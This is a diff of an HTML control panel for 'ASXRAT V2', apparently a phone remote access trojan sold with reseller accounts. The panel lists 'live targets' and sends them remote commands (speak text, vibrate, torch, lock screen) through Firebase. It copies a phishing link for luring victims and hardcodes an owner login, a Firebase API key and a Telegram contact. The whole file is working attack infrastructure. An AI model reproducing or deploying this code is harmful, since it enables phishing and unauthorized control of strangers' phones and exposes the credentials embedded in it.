@@ -3,57 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASXRAT V2 | MASTER CONTROL</title>
+    <title>ASXRAT V2 | MASTER PANEL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #ff0000; --bg: #0a0a0a; --card: #151515; --owner: #ff8000; --user: #00ff40; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
-        #auth { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .card { border: 1px solid var(--neon); padding: 25px; border-radius: 15px; background: var(--card); width: 85%; max-width: 400px; text-align: center; box-shadow: 0 0 15px rgba(255, 0, 0, 0.3); }
-        input, select { width: 95%; padding: 12px; margin: 8px 0; background: #202020; border: 1px solid #333; color: var(--neon); border-radius: 8px; text-align: center; outline: none; font-weight: bold; }
+        :root { --red: #ff0000; --bg: #000000; --card: #0d0d0d; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; overflow-x: hidden; }
+        
+        /* LOGIN AREA */
+        #auth { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 1px solid var(--red); }
+        .login-card { background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid var(--red); width: 85%; max-width: 380px; text-align: center; box-shadow: 0 0 25px var(--red); }
+        
+        .profile-img { width: 110px; height: 110px; border-radius: 50%; border: 3px solid var(--red); margin-bottom: 15px; object-fit: cover; box-shadow: 0 0 15px var(--red); }
+        .welcome-text { font-size: 11px; color: #eee; margin-bottom: 20px; line-height: 1.6; letter-spacing: 1px; }
+        
+        input, select { width: 90%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; }
+        .btn-main { background: var(--red); color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: 0.3s; }
+        .btn-main:active { transform: scale(0.95); opacity: 0.8; }
+        
         #dash { display: none; padding: 15px; max-width: 500px; margin: auto; }
-        .target-card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--neon); }
+        .target-card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
         .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; }
-        .btn-rat { background: #1a1a1a; color: #fff; border: 1px solid var(--neon); padding: 12px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        .btn-main { background: var(--neon); color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
-        .badge { font-size: 10px; padding: 3px 10px; border-radius: 6px; color: #000; font-weight: bold; }
+        .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 12px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="auth">
-        <div class="card">
-            <h1 style="color:var(--neon); margin:0; letter-spacing: 5px;">ASXRAT V2</h1>
-            <p style="color:#555; font-size: 10px; margin-bottom: 20px;">POWERED BY ELVOXI [IEA]</p>
-            <input type="password" id="key-input" placeholder="ENTER ACCESS KEY">
-            <button onclick="login()" class="btn-main">LOGIN PANEL</button>
+        <div class="login-card">
+            <img src="https://i.pinimg.com/736x/8a/3b/4a/8a3b4a39744c77c92b236142c6742a0b.jpg" class="profile-img" onerror="this.src='https://ui-avatars.com/api/?name=ASXRAT&background=ff0000&color=fff'">
+            <div class="welcome-text">
+                HELO BRO SELAMAT DATANG DI APK ASXRAT SEMOGA BETAH<br><br>
+                <span style="color:var(--red); font-weight: bold;">POWERED BY : ELVOXI</span><br>
+                CONTACT TELEGRAM : @Elvoxi_Reals01😘
+            </div>
+            
+            <input type="text" id="email-input" placeholder="EMAIL ADDRESS...">
+            <input type="password" id="key-input" placeholder="SECRET KEY...">
+            <button onclick="login()" class="btn-main">ACCESS PANEL</button>
         </div>
     </div>
 
     <div id="dash">
-        <div class="card" style="width:100%; max-width:100%; margin-bottom:20px; box-sizing:border-box;">
-            <b id="user-display">USER: ...</b> <span id="role-badge" class="badge">ROLE</span><br>
-            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000;">📋 COPY TARGET LINK</button>
+        <div style="padding: 15px; border: 1px solid var(--red); border-radius: 10px; margin-bottom: 20px; background: #050505; text-align: center;">
+            <b id="user-display" style="color:var(--red); font-size: 18px;">...</b> <br>
+            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000; margin-top: 15px;">📋 COPY MY LINK PHISING</button>
             
-            <div id="creation-tools" style="display:none; margin-top:20px; border-top:1px dashed #333; padding-top:15px;">
-                <b style="color:var(--owner)">ADMINISTRATOR TOOLS</b>
-                <input type="text" id="new-key-name" placeholder="NAMA KEY BARU...">
+            <div id="creation-tools" style="display:none; margin-top:20px; border-top:1px dashed #444; padding-top:15px;">
+                <b style="color:var(--red)">CREATE SUB-ACCOUNT</b>
+                <input type="text" id="new-email" placeholder="NEW EMAIL...">
+                <input type="text" id="new-key" placeholder="NEW KEY...">
                 <select id="role-select">
                     <option value="USER">ROLE: USER</option>
                     <option value="OWNER" id="opt-owner">ROLE: OWNER</option>
                 </select>
-                <button onclick="generateKey()" style="background:var(--owner); width:100%; border:none; padding:12px; border-radius:8px; font-weight:bold; color:#000; margin-top:10px;">GENERATE KEY</button>
+                <button onclick="generateUser()" class="btn-main">ACTIVATE ACCOUNT</button>
             </div>
         </div>
 
-        <h4 style="color:var(--neon); text-align: center;">📡 LIVE VICTIMS</h4>
+        <h4 style="color:var(--red); text-align: center; letter-spacing: 3px;">📡 MY LIVE TARGETS</h4>
         <div id="list"></div>
     </div>
 
 <script>
-    // LINK TARGET YANG LU KASIH TADI
-    const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html"; 
+    const linkPhising = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";
 
     const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
@@ -62,31 +75,32 @@
       projectId: "rat-html",
       storageBucket: "rat-html.firebasestorage.app",
       messagingSenderId: "1060124583265",
-      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
-      measurementId: "G-XMHT2S731L"
+      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     let currentKey = "";
-    let userRole = "USER";
 
     function login() {
-        const val = document.getElementById('key-input').value;
-        if(val === "elvoxi122") {
-            currentKey = "PEMILIK"; userRole = "PEMILIK";
+        const mail = document.getElementById('email-input').value;
+        const key = document.getElementById('key-input').value;
+        
+        if(mail === "elvoxi@gmail.com" && key === "elvoxi122") {
+            currentKey = "elvoxi122"; 
             document.getElementById('creation-tools').style.display = 'block';
             start();
         } else {
-            db.ref('mario/all_keys/' + val).once('value', (s) => {
-                if(s.exists()) {
-                    currentKey = val; userRole = s.val().role || "USER";
-                    if(userRole === "OWNER") {
+            db.ref('asxrat/accounts/' + key).once('value', (s) => {
+                const data = s.val();
+                if(s.exists() && data.email === mail) {
+                    currentKey = key;
+                    if(data.role === "OWNER") {
                         document.getElementById('creation-tools').style.display = 'block';
                         document.getElementById('opt-owner').remove();
                     }
                     start();
-                } else alert("KEY SALAH!");
+                } else alert("DATA SALAH!");
             });
         }
     }
@@ -94,27 +108,23 @@
     function start() {
         document.getElementById('auth').style.display = 'none';
         document.getElementById('dash').style.display = 'block';
-        document.getElementById('user-display').innerText = currentKey;
-        const badge = document.getElementById('role-badge');
-        badge.innerText = userRole;
-        badge.style.background = userRole === "PEMILIK" ? "var(--neon)" : (userRole === "OWNER" ? "var(--owner)" : "var(--user)");
-        
+        document.getElementById('user-display').innerText = "OWNER: " + currentKey;
+
         db.ref('mario/targets').on('value', (snap) => {
             const list = document.getElementById('list');
             list.innerHTML = "";
             snap.forEach((child) => {
                 const d = child.val();
-                if(userRole === "PEMILIK" || d.belongsTo === currentKey) {
+                if(d.belongsTo === currentKey) {
                     list.innerHTML += `
                         <div class="target-card">
-                            <b style="color:var(--neon)">📱 ${d.model}</b> <br>
-                            <small style="color:#555">UID: ${child.key} | BY: ${d.belongsTo}</small>
-                            <input type="text" id="tts-${child.key}" placeholder="Ketik pesan suara..." style="width:100%; margin-top:10px; border:1px solid #222;">
+                            <b style="color:var(--red)">📱 ${d.model}</b> <br>
+                            <input type="text" id="tts-${child.key}" placeholder="Ketik pesan suara..." style="width:100%; margin-top:10px;">
                             <div class="btn-grid">
                                 <button class="btn-rat" onclick="sendTTS('${child.key}')">🗣️ SPEAK</button>
                                 <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 VIBRATE</button>
-                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 TORCH ON</button>
-                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_off')">OFF</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'lock_screen')">🔒 LOCK</button>
                             </div>
                         </div>`;
                 }
@@ -123,25 +133,25 @@
     }
 
     function cmd(id, act) { db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); }
-    
     function sendTTS(id) {
         const txt = document.getElementById('tts-' + id).value;
         if(!txt) return;
         db.ref(`mario/commands/${id}`).set({ action: 'speak_text', text: txt, time: Date.now() });
     }
 
-    function generateKey() {
-        const name = document.getElementById('new-key-name').value;
+    function generateUser() {
+        const mail = document.getElementById('new-email').value;
+        const key = document.getElementById('new-key').value;
         const role = document.getElementById('role-select').value;
-        if(!name) return alert("Isi nama key!");
-        db.ref('mario/all_keys/' + name).set({ role: role, createdBy: currentKey, time: Date.now() });
-        alert(`Key [ ${name} ] Aktif.`);
+        db.ref('asxrat/accounts/' + key).set({ email: mail, role: role });
+        alert("ACCOUNT SUCCESS!");
     }
 
     function salinLink() {
-        const fullLink = `${linkWebTarget}?key=${currentKey}`;
-        navigator.clipboard.writeText(fullLink);
-        alert("Link Target ASXRAT V2 Disalin!");
+        const encoded = btoa(currentKey);
+        const full = linkPhising + "?id=" + encoded;
+        navigator.clipboard.writeText(full);
+        alert("LINK PHISING DISALIN!\nKey anda terenkripsi.");
     }
 </script>
 </body>
